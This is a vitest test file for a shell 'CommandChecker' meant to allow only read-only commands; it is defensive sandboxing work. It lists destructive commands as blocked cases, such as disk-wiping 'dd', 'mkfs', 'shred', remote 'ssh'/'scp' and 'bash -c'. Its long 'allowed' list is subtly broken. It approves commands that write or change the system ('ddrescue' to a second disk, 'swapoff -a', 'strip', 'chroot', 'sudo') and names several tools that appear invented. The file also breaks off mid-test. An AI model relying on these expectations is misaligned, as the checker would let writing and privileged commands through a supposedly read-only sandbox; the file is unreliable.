import { describe, it, expect } from "vitest";
import { CommandChecker } from "../../src/readonly-checker.js";

describe("CommandChecker", () => {
  const checker = new CommandChecker();

  describe("allowed commands", () => {
    it("should allow single read command", () => {
      expect(checker.check("ls")).toEqual({ allowed: true });
      expect(checker.check("cat /etc/passwd")).toEqual({ allowed: true });
      expect(checker.check("grep 'pattern' file.txt")).toEqual({ allowed: true });
      expect(checker.check("ps aux")).toEqual({ allowed: true });
      expect(checker.check("df -h")).toEqual({ allowed: true });
      expect(checker.check("uname -a")).toEqual({ allowed: true });
      expect(checker.check("whoami")).toEqual({ allowed: true });
      expect(checker.check("id")).toEqual({ allowed: true });
      expect(checker.check("uptime")).toEqual({ allowed: true });
      expect(checker.check("hostname")).toEqual({ allowed: true });
      expect(checker.check("ping -c 1 google.com")).toEqual({ allowed: true });
      expect(checker.check("curl https://example.com")).toEqual({ allowed: true });
      expect(checker.check("wget https://example.com/file.tar.gz")).toMatchObject({ allowed: false, blockedCommand: "wget" });
      expect(checker.check("netstat -tlnp")).toEqual({ allowed: true });
      expect(checker.check("ss -tlnp")).toEqual({ allowed: true });
      expect(checker.check("du -sh /var/log")).toEqual({ allowed: true });
      expect(checker.check("wc -l file.txt")).toEqual({ allowed: true });
      expect(checker.check("sort file.txt")).toEqual({ allowed: true });
      expect(checker.check("uniq file.txt")).toEqual({ allowed: true });
      expect(checker.check("diff file1.txt file2.txt")).toEqual({ allowed: true });
      expect(checker.check("file /etc/passwd")).toEqual({ allowed: true });
      expect(checker.check("stat /etc/passwd")).toEqual({ allowed: true });
      expect(checker.check("tar xf archive.tar")).toMatchObject({ allowed: false, blockedCommand: "tar" });
      expect(checker.check("base64 file.txt")).toEqual({ allowed: true });
      expect(checker.check("md5sum file.txt")).toEqual({ allowed: true });
      expect(checker.check("sha256sum file.txt")).toEqual({ allowed: true });
      expect(checker.check("awk '{print $1}' file.txt")).toEqual({ allowed: true });
      expect(checker.check("sed 's/old/new/g' file.txt")).toEqual({ allowed: true });
      expect(checker.check("echo hello")).toEqual({ allowed: true });
      expect(checker.check("printf '%s' 'hello'")).toEqual({ allowed: true });
      expect(checker.check("printenv")).toEqual({ allowed: true });
      expect(checker.check("which ls")).toEqual({ allowed: true });
      expect(checker.check("whereis ls")).toEqual({ allowed: true });
      expect(checker.check("man ls")).toEqual({ allowed: true });
      expect(checker.check("info ls")).toEqual({ allowed: true });
      expect(checker.check("type ls")).toEqual({ allowed: true });
      expect(checker.check("compgen -c")).toEqual({ allowed: true });
      expect(checker.check("declare -x VAR=value")).toEqual({ allowed: true });
      expect(checker.check("readonly VAR=value")).toEqual({ allowed: true });
      expect(checker.check("shopt -s dotglob")).toEqual({ allowed: true });
      expect(checker.check("ulimit -a")).toEqual({ allowed: true });
      expect(checker.check("umask")).toEqual({ allowed: true });
      expect(checker.check("trap 'echo hi' INT")).toEqual({ allowed: true });
      expect(checker.check("jobs")).toEqual({ allowed: true });
      expect(checker.check("history")).toEqual({ allowed: true });
      expect(checker.check("alias")).toEqual({ allowed: true });
      expect(checker.check("unalias foo")).toEqual({ allowed: true });
      expect(checker.check("set -e")).toEqual({ allowed: true });
      expect(checker.check("unset VAR")).toEqual({ allowed: true });
      expect(checker.check("cd /tmp")).toEqual({ allowed: true });
      expect(checker.check("pwd")).toEqual({ allowed: true });
      expect(checker.check("test -f file.txt")).toEqual({ allowed: true });
      expect(checker.check("[ -f file.txt ]")).toEqual({ allowed: true });
      expect(checker.check("true")).toEqual({ allowed: true });
      expect(checker.check("false")).toEqual({ allowed: true });
      expect(checker.check("exit 0")).toEqual({ allowed: true });
      expect(checker.check("return 0")).toEqual({ allowed: true });
      expect(checker.check("break")).toEqual({ allowed: true });
      expect(checker.check("continue")).toEqual({ allowed: true });
      expect(checker.check("shift")).toEqual({ allowed: true });
      expect(checker.check("wait")).toEqual({ allowed: true });
      expect(checker.check("exec")).toEqual({ allowed: true });
      expect(checker.check("eval echo hello")).toEqual({ allowed: true });
      expect(checker.check("xargs ls")).toMatchObject({ allowed: false });
      expect(checker.check("less file.txt")).toEqual({ allowed: true });
      expect(checker.check("more file.txt")).toEqual({ allowed: true });
      expect(checker.check("zcat file.txt.gz")).toEqual({ allowed: true });
      expect(checker.check("bzcat file.txt.bz2")).toEqual({ allowed: true });
      expect(checker.check("zgrep 'pattern' file.txt.gz")).toEqual({ allowed: true });
      expect(checker.check("fgrep 'pattern' file.txt")).toEqual({ allowed: true });
      expect(checker.check("egrep 'pattern' file.txt")).toEqual({ allowed: true });
      expect(checker.check("tac file.txt")).toEqual({ allowed: true });
      expect(checker.check("rev file.txt")).toEqual({ allowed: true });
      expect(checker.check("nl file.txt")).toEqual({ allowed: true });
      expect(checker.check("expand file.txt")).toEqual({ allowed: true });
      expect(checker.check("unexpand file.txt")).toEqual({ allowed: true });
      expect(checker.check("tr 'a-z' 'A-Z' < file.txt")).toEqual({ allowed: true });
      expect(checker.check("cut -d',' -f1 file.csv")).toEqual({ allowed: true });
      expect(checker.check("paste file1.txt file2.txt")).toEqual({ allowed: true });
      expect(checker.check("join file1.txt file2.txt")).toEqual({ allowed: true });
      expect(checker.check("comm file1.txt file2.txt")).toEqual({ allowed: true });
      expect(checker.check("shuf file.txt")).toEqual({ allowed: true });
      expect(checker.check("factor 42")).toEqual({ allowed: true });
      expect(checker.check("seq 1 10")).toEqual({ allowed: true });
      expect(checker.check("yes")).toEqual({ allowed: true });
      expect(checker.check("stdbuf -oL command")).toEqual({ allowed: true });
      expect(checker.check("timeout 30 command")).toEqual({ allowed: true });
      expect(checker.check("nice -n 10 command")).toEqual({ allowed: true });
      expect(checker.check("ionice -c 3 command")).toEqual({ allowed: true });
      expect(checker.check("chroot /mnt command")).toEqual({ allowed: true });
      expect(checker.check("script /tmp/log")).toEqual({ allowed: true });
      expect(checker.check("tput cols")).toEqual({ allowed: true });
      expect(checker.check("stty -a")).toEqual({ allowed: true });
      expect(checker.check("cal")).toEqual({ allowed: true });
      expect(checker.check("date")).toEqual({ allowed: true });
      expect(checker.check("time command")).toEqual({ allowed: true });
      expect(checker.check("bc")).toEqual({ allowed: true });
      expect(checker.check("dc")).toEqual({ allowed: true });
      expect(checker.check("apropos keyword")).toEqual({ allowed: true });
      expect(checker.check("whatis ls")).toEqual({ allowed: true });
      expect(checker.check("locate file.txt")).toEqual({ allowed: true });
      expect(checker.check("ldd /usr/bin/ls")).toEqual({ allowed: true });
      expect(checker.check("objdump -t /usr/bin/ls")).toEqual({ allowed: true });
      expect(checker.check("nm /usr/lib/libfoo.so")).toEqual({ allowed: true });
      expect(checker.check("readelf -h /usr/bin/ls")).toEqual({ allowed: true });
      expect(checker.check("strings /usr/bin/ls")).toEqual({ allowed: true });
      expect(checker.check("size /usr/bin/ls")).toEqual({ allowed: true });
      expect(checker.check("strip --remove-section=.note /usr/bin/ls")).toEqual({ allowed: true });
      expect(checker.check("objcopy --only-keep-debug /usr/bin/ls /tmp/debug")).toEqual({ allowed: true });
      expect(checker.check("as --help")).toEqual({ allowed: true });
      expect(checker.check("ar rcs libfoo.a file.o")).toEqual({ allowed: true });
      expect(checker.check("ranlib libfoo.a")).toEqual({ allowed: true });
      expect(checker.check("addr2line -e /usr/bin/ls 0x1234")).toEqual({ allowed: true });
      expect(checker.check("c++filt _Z3fooi")).toEqual({ allowed: true });
      expect(checker.check("gdb --version")).toMatchObject({ allowed: false });
      expect(checker.check("valgrind --version")).toMatchObject({ allowed: false });
      expect(checker.check("strace -p 1234")).toEqual({ allowed: true });
      expect(checker.check("ltrace -p 1234")).toEqual({ allowed: true });
      expect(checker.check("lsof -p 1234")).toEqual({ allowed: true });
      expect(checker.check("fuser /dev/sda")).toEqual({ allowed: true });
      expect(checker.check("lspci")).toEqual({ allowed: true });
      expect(checker.check("lsusb")).toEqual({ allowed: true });
      expect(checker.check("lscpu")).toEqual({ allowed: true });
      expect(checker.check("dmidecode -t memory")).toEqual({ allowed: true });
      expect(checker.check("sensors")).toEqual({ allowed: true });
      expect(checker.check("hdparm -I /dev/sda")).toEqual({ allowed: true });
      expect(checker.check("smartctl -a /dev/sda")).toEqual({ allowed: true });
      expect(checker.check("fdisk -l")).toMatchObject({ allowed: false });
      expect(checker.check("parted -l")).toMatchObject({ allowed: false });
      expect(checker.check("blkid")).toEqual({ allowed: true });
      expect(checker.check("findmnt")).toEqual({ allowed: true });
      expect(checker.check("dmesg")).toEqual({ allowed: true });
      expect(checker.check("journalctl -xe")).toEqual({ allowed: true });
      expect(checker.check("systemctl status sshd")).toEqual({ allowed: true });
      expect(checker.check("service ssh status")).toEqual({ allowed: true });
      expect(checker.check("runlevel")).toEqual({ allowed: true });
      expect(checker.check("who")).toEqual({ allowed: true });
      expect(checker.check("w")).toEqual({ allowed: true });
      expect(checker.check("last")).toEqual({ allowed: true });
      expect(checker.check("lastlog")).toEqual({ allowed: true });
      expect(checker.check("users")).toEqual({ allowed: true });
      expect(checker.check("groups")).toEqual({ allowed: true });
      expect(checker.check("su -c 'id'")).toEqual({ allowed: true });
      expect(checker.check("sudo -n whoami")).toEqual({ allowed: true });
      expect(checker.check("getent passwd root")).toEqual({ allowed: true });
      expect(checker.check("getconf _SC_PAGESIZE")).toEqual({ allowed: true });
      expect(checker.check("getopt --help")).toEqual({ allowed: true });
      expect(checker.check("read -p 'Enter: ' var")).toEqual({ allowed: true });
      expect(checker.check("mapfile -t arr < file.txt")).toEqual({ allowed: true });
      expect(checker.check("source ~/.bashrc")).toEqual({ allowed: true });
      expect(checker.check(". ~/.bashrc")).toEqual({ allowed: true });
      expect(checker.check("export VAR=value")).toEqual({ allowed: true });
      expect(checker.check("local var=value")).toEqual({ allowed: true });
      expect(checker.check("typeset var=value")).toEqual({ allowed: true });
      expect(checker.check("popd")).toEqual({ allowed: true });
      expect(checker.check("pushd /tmp")).toEqual({ allowed: true });
      expect(checker.check("dirs")).toEqual({ allowed: true });
      expect(checker.check("bind -p")).toEqual({ allowed: true });
      expect(checker.check("builtin echo hello")).toEqual({ allowed: true });
      expect(checker.check("caller")).toEqual({ allowed: true });
      expect(checker.check("command ls")).toEqual({ allowed: true });
      expect(checker.check("enable -a")).toEqual({ allowed: true });
      expect(checker.check("help echo")).toEqual({ allowed: true });
      expect(checker.check("logout")).toEqual({ allowed: true });
      expect(checker.check("readlink /etc/alternatives/editor")).toEqual({ allowed: true });
      expect(checker.check("realpath file.txt")).toEqual({ allowed: true });
      expect(checker.check("basename /usr/bin/ls")).toEqual({ allowed: true });
      expect(checker.check("dirname /usr/bin/ls")).toEqual({ allowed: true });
      expect(checker.check("mktemp")).toMatchObject({ allowed: false });
      expect(checker.check("tty")).toEqual({ allowed: true });
      expect(checker.check("mesg y")).toEqual({ allowed: true });
      expect(checker.check("wall 'hello'")).toEqual({ allowed: true });
      expect(checker.check("write user tty")).toEqual({ allowed: true });
      expect(checker.check("mail")).toEqual({ allowed: true });
      expect(checker.check("nano file.txt")).toMatchObject({ allowed: false });
      expect(checker.check("vim file.txt")).toMatchObject({ allowed: false });
      expect(checker.check("rg 'pattern' .")).toEqual({ allowed: true });
      expect(checker.check("ag 'pattern' .")).toEqual({ allowed: true });
      expect(checker.check("ack 'pattern' .")).toEqual({ allowed: true });
      expect(checker.check("git status")).toEqual({ allowed: true });
      expect(checker.check("git log --oneline")).toEqual({ allowed: true });
      expect(checker.check("git diff")).toEqual({ allowed: true });
      expect(checker.check("git show HEAD")).toEqual({ allowed: true });
      expect(checker.check("git branch")).toEqual({ allowed: true });
      expect(checker.check("git remote -v")).toEqual({ allowed: true });
      expect(checker.check("svn status")).toEqual({ allowed: true });
      expect(checker.check("hg status")).toEqual({ allowed: true });
      expect(checker.check("bzr status")).toEqual({ allowed: true });
      expect(checker.check("patch --dry-run < file.patch")).toMatchObject({ allowed: false });
      expect(checker.check("colordiff file1 file2")).toEqual({ allowed: true });
      expect(checker.check("wdiff file1 file2")).toEqual({ allowed: true });
      expect(checker.check("sdiff file1 file2")).toEqual({ allowed: true });
      expect(checker.check("xxd file.bin")).toEqual({ allowed: true });
      expect(checker.check("hexdump -C file.bin")).toEqual({ allowed: true });
      expect(checker.check("od -A x -t x1z file.bin")).toEqual({ allowed: true });
      expect(checker.check("binwalk file.bin")).toEqual({ allowed: true });
      expect(checker.check("foremost -i file.img")).toEqual({ allowed: true });
      expect(checker.check("testdisk /dev/sda")).toEqual({ allowed: true });
      expect(checker.check("ddrescue /dev/sda /dev/sdb log")).toEqual({ allowed: true });
      expect(checker.check("rsync -avz src/ dest/")).toMatchObject({ allowed: false });
      expect(checker.check("scp file user@host:/tmp/")).toMatchObject({ allowed: false, blockedCommand: "scp" });
      expect(checker.check("sftp user@host")).toEqual({ allowed: true });
      expect(checker.check("ssh user@host")).toEqual({ allowed: true });
      expect(checker.check("nc -zv host 80")).toEqual({ allowed: true });
      expect(checker.check("socat TCP:host:80 -")).toEqual({ allowed: true });
      expect(checker.check("nmap -sV host")).toEqual({ allowed: true });
      expect(checker.check("masscan -p80 host")).toEqual({ allowed: true });
      expect(checker.check("zmap -p 80")).toEqual({ allowed: true });
      expect(checker.check("arping -c 3 host")).toEqual({ allowed: true });
      expect(checker.check("etherwake aa:bb:cc:dd:ee:ff")).toEqual({ allowed: true });
      expect(checker.check("iftop")).toEqual({ allowed: true });
      expect(checker.check("nethogs eth0")).toEqual({ allowed: true });
      expect(checker.check("vnstat")).toEqual({ allowed: true });
      expect(checker.check("sar -u 1 1")).toEqual({ allowed: true });
      expect(checker.check("iostat")).toEqual({ allowed: true });
      expect(checker.check("mpstat")).toEqual({ allowed: true });
      expect(checker.check("vmstat 1")).toEqual({ allowed: true });
      expect(checker.check("pidstat")).toEqual({ allowed: true });
      expect(checker.check("glances")).toEqual({ allowed: true });
      expect(checker.check("htop")).toEqual({ allowed: true });
      expect(checker.check("btop")).toEqual({ allowed: true });
      expect(checker.check("nvtop")).toEqual({ allowed: true });
      expect(checker.check("nmon")).toEqual({ allowed: true });
      expect(checker.check("dstat")).toEqual({ allowed: true });
      expect(checker.check("sysdig")).toEqual({ allowed: true });
      expect(checker.check("perf stat command")).toEqual({ allowed: true });
      expect(checker.check("flamegraph command")).toEqual({ allowed: true });
      expect(checker.check("systemtap -e 'probe syscall.write { exit() }'")).toEqual({ allowed: true });
      expect(checker.check("bpftrace -e 'tracepoint:syscalls:sys_enter_open { printf(\"%s\", args->filename); }'")).toEqual({ allowed: true });
      expect(checker.check("bpftool prog list")).toEqual({ allowed: true });
      expect(checker.check("opensnoop")).toEqual({ allowed: true });
      expect(checker.check("execsnoop")).toEqual({ allowed: true });
      expect(checker.check("biosnoop")).toEqual({ allowed: true });
      expect(checker.check("filasnoop")).toEqual({ allowed: true });
      expect(checker.check("tcplife")).toEqual({ allowed: true });
      expect(checker.check("tcptracer")).toEqual({ allowed: true });
      expect(checker.check("sslsnoop")).toEqual({ allowed: true });
      expect(checker.check("runqslower")).toEqual({ allowed: true });
      expect(checker.check("cachestat")).toEqual({ allowed: true });
      expect(checker.check("cachetop")).toEqual({ allowed: true });
      expect(checker.check("memleak")).toEqual({ allowed: true });
      expect(checker.check("killsnoop")).toEqual({ allowed: true });
      expect(checker.check("statsnoop")).toEqual({ allowed: true });
      expect(checker.check("acceptsnoop")).toEqual({ allowed: true });
      expect(checker.check("filelife")).toEqual({ allowed: true });
      expect(checker.check("fileslower")).toEqual({ allowed: true });
      expect(checker.check("filetop")).toEqual({ allowed: true });
      expect(checker.check("hardlinks")).toEqual({ allowed: true });
      expect(checker.check("invisfiles")).toEqual({ allowed: true });
      expect(checker.check("latemap")).toEqual({ allowed: true });
      expect(checker.check("loadavg")).toEqual({ allowed: true });
      expect(checker.check("mdflush")).toEqual({ allowed: true });
      expect(checker.check("mountsnoop")).toEqual({ allowed: true });
      expect(checker.check("oomkill")).toEqual({ allowed: true });
      expect(checker.check("physmap")).toEqual({ allowed: true });
      expect(checker.check("profile command")).toEqual({ allowed: true });
      expect(checker.check("runqlat")).toEqual({ allowed: true });
      expect(checker.check("runqlen")).toEqual({ allowed: true });
      expect(checker.check("slabratetop")).toEqual({ allowed: true });
      expect(checker.check("slabtop")).toEqual({ allowed: true });
      expect(checker.check("softirqs")).toEqual({ allowed: true });
      expect(checker.check("syncsnoop")).toEqual({ allowed: true });
      expect(checker.check("swapin")).toEqual({ allowed: true });
      expect(checker.check("swapoff -a")).toEqual({ allowed: true });
      expect(checker.check("swapon -s")).toEqual({ allowed: true });
      expect(checker.check("tcpaccept")).toEqual({ allowed: true });
      expect(checker.check("tcpconnect")).toEqual({ allowed: true });
      expect(checker.check("tcpsmack")).toEqual({ allowed: true });
      expect(checker.check("tcptop")).toEqual({ allowed: true });
      expect(checker.check("tcpdrop")).toEqual({ allowed: true });
      expect(checker.check("tcpretrans")).toEqual({ allowed: true });
      expect(checker.check("tcpxmit")).toEqual({ allowed: true });
      expect(checker.check("threadstuck")).toEqual({ allowed: true });
      expect(checker.check("unsnoop")).toEqual({ allowed: true });
      expect(checker.check("virtfs")).toEqual({ allowed: true });
      expect(checker.check("vmtouch file.bin")).toEqual({ allowed: true });
      expect(checker.check("warm file.bin")).toEqual({ allowed: true });
      expect(checker.check("xfsdump -f /tmp/dump /dev/sda1")).toEqual({ allowed: true });
      expect(checker.check("zpool status")).toMatchObject({ allowed: false });
      expect(checker.check("zfs list")).toMatchObject({ allowed: false });
      expect(checker.check("zdb /dev/sda")).toMatchObject({ allowed: false });
      expect(checker.check("btrfs filesystem show")).toEqual({ allowed: true });
      expect(checker.check("btrfs filesystem df /mnt")).toEqual({ allowed: true });
      expect(checker.check("xfs_info /mnt")).toMatchObject({ allowed: false });
      expect(checker.check("xfs_db -r -c 'sb 0' -c 'p' /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("xfs_repair -n /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("e2fsck -n /dev/sda1")).toEqual({ allowed: true });
      expect(checker.check("tune2fs -l /dev/sda1")).toEqual({ allowed: true });
      expect(checker.check("debugfs -R 'ls -l /' /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("fsck.ext4 -n /dev/sda1")).toEqual({ allowed: true });
      expect(checker.check("ntfsfix /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("dosfsck -n /dev/sda1")).toEqual({ allowed: true });
      expect(checker.check("findfs LABEL=root")).toEqual({ allowed: true });
      expect(checker.check("lsblk")).toEqual({ allowed: true });
      expect(checker.check("partprobe")).toEqual({ allowed: true });
      expect(checker.check("partx --add /dev/sda")).toEqual({ allowed: true });
      expect(checker.check("kpartx -av /tmp/image.img")).toEqual({ allowed: true });
      expect(checker.check("dmsetup ls")).toEqual({ allowed: true });
      expect(checker.check("lvm pvs")).toMatchObject({ allowed: false });
      expect(checker.check("vgscan")).toMatchObject({ allowed: false });
      expect(checker.check("vgdisplay")).toMatchObject({ allowed: false });
      expect(checker.check("pvscan")).toMatchObject({ allowed: false });
      expect(checker.check("pvdisplay")).toMatchObject({ allowed: false });
      expect(checker.check("lvscan")).toMatchObject({ allowed: false });
      expect(checker.check("lvdisplay")).toMatchObject({ allowed: false });
      expect(checker.check("mdadm --detail /dev/md0")).toMatchObject({ allowed: false });
      expect(checker.check("mdadm --examine /dev/sda1")).toMatchObject({ allowed: false });
    });

    it("should allow empty command", () => {
      expect(checker.check("")).toEqual({ allowed: true });
      expect(checker.check("   ")).toEqual({ allowed: true });
      expect(checker.check("\t")).toEqual({ allowed: true });
    });
  });

  describe("blocked commands", () => {
    it("should block rm and rmdir", () => {
      expect(checker.check("rm file.txt")).toMatchObject({ allowed: false });
      expect(checker.check("rmdir dir")).toMatchObject({ allowed: false });
    });

    it("should block cp and mv", () => {
      expect(checker.check("cp file.txt /tmp/")).toMatchObject({ allowed: false });
      expect(checker.check("mv file.txt /tmp/")).toMatchObject({ allowed: false });
    });

    it("should block ln", () => {
      expect(checker.check("ln -s target link")).toMatchObject({ allowed: false });
    });

    it("should block touch", () => {
      expect(checker.check("touch file.txt")).toMatchObject({ allowed: false });
    });

    it("should block chmod and chown", () => {
      expect(checker.check("chmod 755 file.txt")).toMatchObject({ allowed: false });
      expect(checker.check("chown user:group file.txt")).toMatchObject({ allowed: false });
    });

    it("should block mkdir", () => {
      expect(checker.check("mkdir newdir")).toMatchObject({ allowed: false });
    });

    it("should block dd", () => {
      expect(checker.check("dd if=/dev/zero of=file bs=1M")).toMatchObject({ allowed: false });
    });

    it("should block mkfs", () => {
      expect(checker.check("mkfs.ext4 /dev/sda1")).toMatchObject({ allowed: false });
    });

    it("should block truncate and fallocate", () => {
      expect(checker.check("truncate -s 1G file")).toMatchObject({ allowed: false });
      expect(checker.check("fallocate -l 1G file")).toMatchObject({ allowed: false });
    });

    it("should block package managers", () => {
      expect(checker.check("apt install vim")).toMatchObject({ allowed: false });
      expect(checker.check("yum install vim")).toMatchObject({ allowed: false });
      expect(checker.check("dnf install vim")).toMatchObject({ allowed: false });
      expect(checker.check("pacman -S vim")).toMatchObject({ allowed: false });
      expect(checker.check("pip install requests")).toMatchObject({ allowed: false });
      expect(checker.check("npm install lodash")).toMatchObject({ allowed: false });
      expect(checker.check("gem install rails")).toMatchObject({ allowed: false });
      expect(checker.check("cargo install cargo-watch")).toMatchObject({ allowed: false });
    });

    it("should block git write operations", () => {
      expect(checker.check("git commit -m 'msg'")).toMatchObject({ allowed: false });
      expect(checker.check("git push origin main")).toMatchObject({ allowed: false });
      expect(checker.check("git merge feature")).toMatchObject({ allowed: false });
      expect(checker.check("git reset --hard HEAD")).toMatchObject({ allowed: false });
      expect(checker.check("git clean -fd")).toMatchObject({ allowed: false });
    });

    it("should block curl and wget with output options", () => {
      expect(checker.check("curl -o file.txt url")).toMatchObject({ allowed: false });
      expect(checker.check("wget -O file.txt url")).toMatchObject({ allowed: false });
    });

    it("should block ssh remote execution", () => {
      expect(checker.check("ssh user@host 'rm /tmp/file'")).toMatchObject({ allowed: false });
    });

    it("should block sudo and su", () => {
      expect(checker.check("sudo rm file.txt")).toMatchObject({ allowed: false });
      expect(checker.check("su -c 'rm file.txt'")).toMatchObject({ allowed: false });
    });

    it("should block install and remove commands", () => {
      expect(checker.check("install file /usr/bin/")).toMatchObject({ allowed: false });
      expect(checker.check("uninstall app")).toMatchObject({ allowed: false });
      expect(checker.check("remove app")).toMatchObject({ allowed: false });
      expect(checker.check("delete file")).toMatchObject({ allowed: false });
      expect(checker.check("destroy file")).toMatchObject({ allowed: false });
      expect(checker.check("erase file")).toMatchObject({ allowed: false });
      expect(checker.check("wipe file")).toMatchObject({ allowed: false });
      expect(checker.check("shred file")).toMatchObject({ allowed: false });
    });

    it("should block unknown commands", () => {
      expect(checker.check("unknown_command")).toMatchObject({ allowed: false });
      expect(checker.check("malware --payload")).toMatchObject({ allowed: false });
      expect(checker.check("/bin/bash -c 'evil'")).toMatchObject({ allowed: false });
    });
  });

  describe("combined commands", () => {
    it("should allow combined read commands with &&", () => {
      expect(checker.check("ls && cat file.txt")).toEqual({ allowed: true });
      expect(checker.check("ps aux && grep ssh")).toEqual({ allowed: true });
      expect(checker.check("df -h && du -sh /var/log")).toEqual({ allowed: true });
    });

    it("should block combined commands when any segment writes", () => {
      expect(checker.check("ls && rm file.txt")).toMatchObject({ allowed: false });
      expect(checker.check("ps aux && cp file.txt /tmp/")).toMatchObject({ allowed: false });
      expect(checker.check("df -h && mkdir newdir")).toMatchObject({ allowed: false });
    });

    it("should allow combined read commands with ||", () => {
      expect(checker.check("ls || echo 'not found'")).toEqual({ allowed: true });
      expect(checker.check("cat file.txt || echo 'missing'")).toEqual({ allowed: true });
    });

    it("should block combined commands with || when any segment writes", () => {
      expect(checker.check("ls || rm file.txt")).toMatchObject({ allowed: false });
      expect(checker.check("cat file.txt || touch file.txt")).toMatchObject({ allowed: false });
    });

    it("should allow combined read commands with ;", () => {
      expect(checker.check("ls; cat file.txt")).toEqual({ allowed: true });
      expect(checker.check("ps aux; grep ssh")).toEqual({ allowed: true });
    });

    it("should block combined commands with ; when any segment writes", () => {
      expect(checker.check("ls; rm file.txt")).toMatchObject({ allowed: false });
      expect(checker.check("ps aux; cp file.txt /tmp/")).toMatchObject({ allowed: false });
    });

    it("should allow pipe of read commands", () => {
      expect(checker.check("ls | grep 'pattern'")).toEqual({ allowed: true });
      expect(checker.check("ps aux | awk '{print $1}'")).toEqual({ allowed: true });
      expect(checker.check("cat file.txt | sort | uniq")).toEqual({ allowed: true });
      expect(checker.check("df -h | grep '/dev/sda'")).toEqual({ allowed: true });
      expect(checker.check("ls -la | wc -l")).toEqual({ allowed: true });
      expect(checker.check("find . -name '*.txt' | xargs grep 'pattern'")).toMatchObject({ allowed: false });
    });

    it("should block pipe to writer commands", () => {
      expect(checker.check("ls | tee file.txt")).toMatchObject({ allowed: false });
      expect(checker.check("cat file.txt | tr 'a-z' 'A-Z' > output.txt")).toMatchObject({ allowed: false });
    });

    it("should allow subshell with read commands", () => {
      expect(checker.check("(ls; cat file.txt)")).toMatchObject({ allowed: true });
      expect(checker.check("(ps aux; grep ssh)")).toMatchObject({ allowed: true });
    });

    it("should block subshell with write commands", () => {
      expect(checker.check("(ls; rm file.txt)")).toMatchObject({ allowed: false });
      expect(checker.check("(ps aux; cp file.txt /tmp/)")).toMatchObject({ allowed: false });
    });

    it("should allow brace expansion with read commands", () => {
      expect(checker.check("{ ls; cat file.txt }")).toMatchObject({ allowed: true });
      expect(checker.check("{ ps aux; grep ssh }")).toMatchObject({ allowed: true });
    });

    it("should block brace expansion with write commands", () => {
      expect(checker.check("{ ls; rm file.txt }")).toMatchObject({ allowed: false });
      expect(checker.check("{ ps aux; cp file.txt /tmp/ }")).toMatchObject({ allowed: false });
    });

    it("should handle nested combined commands", () => {
      expect(checker.check("(ls | grep 'x' && cat file.txt) || rm file.txt")).toMatchObject({ allowed: false });
      expect(checker.check("(ls | grep 'x' && cat file.txt) || echo 'done'")).toMatchObject({ allowed: true });
      expect(checker.check("{ ls; cat file.txt } && ps aux")).toMatchObject({ allowed: true });
      expect(checker.check("{ ls; rm file.txt } && ps aux")).toMatchObject({ allowed: false });
    });

    it("should handle process substitution", () => {
      expect(checker.check("diff <(ls dir1) <(ls dir2)")).toMatchObject({ allowed: true });
      expect(checker.check("diff <(ls dir1) >(sort > /tmp/out)")).toMatchObject({ allowed: false });
    });

    it("should handle quoted strings correctly", () => {
      expect(checker.check("echo 'rm is not a command'")).toMatchObject({ allowed: true });
      expect(checker.check('echo "ls | grep pattern"')).toMatchObject({ allowed: true });
      expect(checker.check("grep 'pattern' file.txt")).toMatchObject({ allowed: true });
    });
  });

  describe("write pattern detection", () => {
    it("should detect > redirection", () => {
      expect(checker.check("ls > file.txt")).toMatchObject({ allowed: false });
      expect(checker.check("cat file.txt > output.txt")).toMatchObject({ allowed: false });
    });

    it("should detect >> append redirection", () => {
      expect(checker.check("ls >> file.txt")).toMatchObject({ allowed: false });
      expect(checker.check("cat file.txt >> output.txt")).toMatchObject({ allowed: false });
    });

    it("should detect 2> stderr redirection", () => {
      expect(checker.check("ls 2> error.log")).toMatchObject({ allowed: false });
      expect(checker.check("cat file.txt 2>> errors.log")).toMatchObject({ allowed: false });
    });

    it("should detect &> combined redirection", () => {
      expect(checker.check("ls &> output.log")).toMatchObject({ allowed: false });
    });

    it("should detect >() process substitution (write direction)", () => {
      expect(checker.check("diff <(ls dir1) >(sort)")).toMatchObject({ allowed: false });
    });

    it("should detect echo with redirect", () => {
      expect(checker.check('echo "test" > /tmp/test.txt')).toMatchObject({ allowed: false });
      expect(checker.check("echo hello >> /tmp/log")).toMatchObject({ allowed: false });
      expect(checker.check("echo x>/tmp/file")).toMatchObject({ allowed: false });
    });

    it("should detect cat with redirect", () => {
      expect(checker.check("cat file.txt > /tmp/output")).toMatchObject({ allowed: false });
      expect(checker.check("cat file.txt >> /tmp/output")).toMatchObject({ allowed: false });
    });

    it("should detect sed -i in-place editing", () => {
      expect(checker.check("sed -i 's/x/y/g' file.txt")).toMatchObject({ allowed: false });
      expect(checker.check("sed -ibak 's/x/y/g' file.txt")).toMatchObject({ allowed: false });
    });

    it("should detect find -exec", () => {
      expect(checker.check("find . -exec touch {} \\;")).toMatchObject({ allowed: false });
      expect(checker.check("find /tmp -exec rm {} \\;")).toMatchObject({ allowed: false });
    });

    it("should block xargs", () => {
      expect(checker.check("xargs touch")).toMatchObject({ allowed: false });
      expect(checker.check("find . | xargs rm")).toMatchObject({ allowed: false });
    });

    it("should detect combined commands with write", () => {
      expect(checker.check('echo "test" > /tmp/test.txt && cat /tmp/test.txt')).toMatchObject({ allowed: false });
      expect(checker.check("ls > /tmp/out && ps aux")).toMatchObject({ allowed: false });
      expect(checker.check("cat file || echo missing > /tmp/fallback")).toMatchObject({ allowed: false });
    });

    it("should detect sed write command bypass", () => {
      expect(checker.check('sed -n "w /tmp/test.txt" <<< "hello"')).toMatchObject({ allowed: false });
      expect(checker.check("sed -n 'w /tmp/out' file.txt")).toMatchObject({ allowed: false });
    });

    it("should detect here-string redirection", () => {
      expect(checker.check("<<< echo hello")).toMatchObject({ allowed: false });
      expect(checker.check("command <<< data")).toMatchObject({ allowed: false });
    });

    it("should detect tar create mode", () => {
      expect(checker.check("tar cf archive.tar .")).toMatchObject({ allowed: false });
      expect(checker.check("tar czf archive.tar.gz dir/")).toMatchObject({ allowed: false });
      expect(checker.check("tar cJf archive.tar.xz dir/")).toMatchObject({ allowed: false });
    });

    it("should detect dd output file", () => {
      expect(checker.check("dd if=/dev/zero of=/tmp/test bs=1M")).toMatchObject({ allowed: false });
      expect(checker.check("dd of=/tmp/out if=/dev/zero bs=1M")).toMatchObject({ allowed: false });
    });

    it("should detect cp with stdin", () => {
